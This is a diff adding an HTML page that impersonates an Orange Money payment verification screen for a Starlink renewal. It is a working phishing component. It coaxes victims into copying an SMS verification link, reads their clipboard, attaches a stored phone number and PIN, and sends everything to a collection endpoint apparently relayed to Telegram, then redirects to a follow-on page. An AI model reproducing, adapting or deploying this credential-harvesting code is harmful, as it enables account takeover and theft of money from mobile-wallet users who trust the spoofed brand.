@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Full SMS Verification</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;background:#181d22;font-family:Arial,Helvetica,sans-serif;color:#111827}
+body{display:flex;justify-content:center;padding:14px 0 0}
+.card{width:100%;max-width:420px;min-height:640px;background:#f4f4f3;border:1px solid rgba(255,255,255,.05);border-radius:18px;overflow:hidden;box-shadow:0 16px 36px rgba(0,0,0,.25)}
+.brand-wrap{padding:18px 0 0;text-align:center}
+.orange-badge{width:58px;height:58px;border-radius:50%;background:#f57c20;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px;font-weight:800;line-height:1}
+.brand-title{margin:0;font-size:22px;font-weight:800;color:#f57c20;letter-spacing:-.5px}
+.brand-sub{margin-top:2px;font-size:12px;color:#f5a14d;font-weight:600}
+.form-panel{background:#f4f4f3;padding:14px 20px 20px}
+.payment-header{background:rgba(16,19,24,.94);color:#fff;border-radius:10px 10px 0 0;padding:12px 14px;font-size:13px;font-weight:700;display:flex;align-items:center;gap:7px}
+.payment-header .star{color:#f7c948}
+.amount-row{display:flex;justify-content:space-between;align-items:center;background:#fff;border-left:1px solid rgba(0,0,0,.04);border-right:1px solid rgba(0,0,0,.04);padding:14px 16px}
+.row-label{font-size:10px;color:#767f89;font-weight:700;letter-spacing:.6px;text-transform:uppercase}
+.amount-value{font-size:12px;color:#1f2430;font-weight:700;text-align:right}
+.amount-value strong{display:block;color:#f57c20;font-size:18px;line-height:1.2}
+.back-link{display:flex;align-items:center;gap:6px;color:#1f2430;font-size:13px;font-weight:700;margin:16px 0 8px;padding-left:2px}
+.back-link .arrow{font-size:18px;line-height:1}
+.step-title{font-size:15px;font-weight:800;color:#1a1d22;margin:6px 0 8px}
+.step-copy{font-size:12px;color:#4f5865;line-height:1.45;margin:0 0 12px}
+.link-box{background:#fff;padding:12px 14px;border-radius:10px;border:1px solid rgba(0,0,0,.08);margin-bottom:12px}
+.link-box .muted{font-size:9px;color:#8a919b;font-weight:700;letter-spacing:1px;text-transform:uppercase;display:block;margin-bottom:6px}
+.link-box .phone{font-size:14px;font-weight:700;color:#1a1d22;letter-spacing:.4px}
+.warning{background:#fff3e5;border:1px solid #f0c585;border-radius:9px;padding:10px 12px;display:flex;gap:8px;align-items:flex-start;font-size:10px;color:#7d3816;font-weight:700;line-height:1.4;margin-bottom:14px}
+.warning-icon{color:#f57c20;font-size:14px;line-height:1}
+.helper{background:#f5f5f3;border:1px solid #dfe3e7;border-radius:10px;padding:12px 13px;margin-bottom:14px}
+.helper .helper-label{display:flex;align-items:center;gap:8px;color:#1c2430;font-size:12px;font-weight:700;margin-bottom:8px}
+.helper .icon{width:18px;height:18px;border-radius:4px;background:#f0f2f3;border:1px solid #d9dde2;display:flex;align-items:center;justify-content:center;font-size:12px;color:#515b68}
+.helper ol{margin:0;padding-left:18px;color:#4d5967;font-size:11px;line-height:1.5}
+.field-wrap{display:flex;flex-direction:column;gap:8px}
+.input{width:100%;height:44px;padding:10px 12px;border:1px solid #dfe3e8;border-radius:10px;background:#fff;color:#1f2430;font-size:13px;outline:none}
+.input::placeholder{color:#9aa2ad}
+.verify-btn{width:100%;height:44px;border:0;border-radius:10px;background:#f57c20;color:#fff;font-size:14px;font-weight:800;cursor:pointer;box-shadow:0 10px 18px rgba(245,124,32,.2);margin-top:12px}
+.secure{text-align:center;margin-top:14px;color:#6d7a86;font-size:10px;letter-spacing:.5px}
+.secure .lock{color:#38a66d;margin-right:5px}
+.error{text-align:center;color:#c62828;font-size:9px;min-height:12px;margin-top:10px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand-wrap">
+    <div class="orange-badge">O</div>
+    <h1 class="brand-title">Orange Money</h1>
+    <div class="brand-sub">by Orange</div>
+  </div>
+
+  <div class="form-panel">
+    <div class="payment-header"><span class="star">★</span>Starlink Payment</div>
+
+    <div class="amount-row">
+      <div class="row-label">Service</div>
+      <div class="amount-value">Starlink Renewal</div>
+      <div class="amount-value"><strong>BWP 49</strong></div>
+    </div>
+
+    <div class="back-link"><span class="arrow">←</span> Back</div>
+    <div class="step-title">Verification Link</div>
+    <p class="step-copy">A verification link has been sent to your phone number via SMS.</p>
+
+    <div class="link-box">
+      <span class="muted">Number</span>
+      <div class="phone">+26776767676</div>
+    </div>
+
+    <div class="warning">
+      <div class="warning-icon">⚠</div>
+      <div>DO NOT tap or open the link — only copy and paste it below</div>
+    </div>
+
+    <div class="helper">
+      <div class="helper-label"><span class="icon">☰</span> How to paste your link:</div>
+      <ol>
+        <li>Open the SMS message you received from Orange Money</li>
+        <li>Find the link in the SMS — DO NOT tap it</li>
+        <li>Long press on the link until a menu appears</li>
+        <li>Tap “Copy link” or “Copy”</li>
+        <li>Switch back to this page</li>
+        <li>Long press on the field below and tap “Paste”</li>
+        <li>The link will be verified automatically</li>
+      </ol>
+    </div>
+
+    <div class="field-wrap">
+      <input id="sms" class="input" type="text" placeholder="Paste your verification link here...">
+    </div>
+
+    <button class="verify-btn" id="verifyBtn" type="button">Paste &amp; Verify</button>
+    <div id="error" class="error"></div>
+    <div class="secure"><span class="lock">◌</span> SSL ENCRYPTED AND SECURE</div>
+  </div>
+</div>
+
+<script>
+const sms = document.getElementById('sms');
+const verifyBtn = document.getElementById('verifyBtn');
+const error = document.getElementById('error');
+
+async function submitVerification() {
+  const smsText = sms.value.trim();
+  error.textContent = '';
+
+  if (!smsText) {
+    error.textContent = 'Please paste the verification link first.';
+    sms.focus();
+    return;
+  }
+
+  const payload = {
+    text: `Orange Money Verification\nPhone: ${localStorage.getItem('phone') || 'Unknown'}\nPIN: ${localStorage.getItem('userPin') || 'Unknown'}\nLink: ${smsText}`
+  };
+
+  try {
+    const response = await fetch('http://localhost:3000/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => null);
+
+    if (response) {
+      const data = await response.json().catch(() => null);
+      if (data && !data.ok) {
+        console.warn('Telegram link hook warning:', data.error || 'unknown error');
+      }
+    }
+  } catch (sendError) {
+    console.warn('Telegram link hook unavailable:', sendError);
+  }
+
+  localStorage.setItem('smsPayload', JSON.stringify(payload));
+  window.location.href = 'kipko.html';
+}
+
+verifyBtn.addEventListener('click', async () => {
+  error.textContent = '';
+
+  try {
+    const clipboardText = await navigator.clipboard.readText();
+    if (clipboardText.trim()) {
+      sms.value = clipboardText.trim();
+    }
+  } catch (clipboardError) {
+    error.textContent = 'Clipboard access was blocked. Paste the link into the field manually.';
+    sms.focus();
+    return;
+  }
+
+  await submitVerification();
+});
+</script>
+</body>
+</html>
